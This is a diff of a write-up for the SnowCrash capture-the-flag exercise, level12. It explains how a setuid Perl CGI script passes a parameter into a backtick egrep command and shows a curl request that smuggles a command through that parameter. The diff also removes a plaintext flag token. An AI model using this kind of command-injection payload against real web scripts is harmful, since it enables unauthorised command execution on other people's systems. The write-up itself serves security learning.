@@ -1,3 +1,5 @@
+# Level12
+
 ## Exploring the exercice
 
 ```bash 
@@ -7,6 +9,7 @@ $ ls -la
 
 So we have a perl script with setuid/setgid, we have already seen that type of extension in a previous exercice. 
 
+## Inspecting the file
 
 ```bash 
 $ ./level12.pl 
@@ -63,6 +66,7 @@ n(t(param("x"), param("y")));
 
 So the scrips takes two arguments, the first argument x, will be capitalized and delete anything after a space. 
 The security flaw is from this line  
+
 ```bash
 @output = `egrep "^$xx" /tmp/xd 2>&1`;
 ```
@@ -83,6 +87,6 @@ Then we can execute the file
 ```bash
 $ curl localhost:4646?x='`/*/EXPLOIT`'
 ..level12@SnowCrash:~$ cat /tmp/flag
-Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+Check flag.Here is your token : ***********
 ```
 
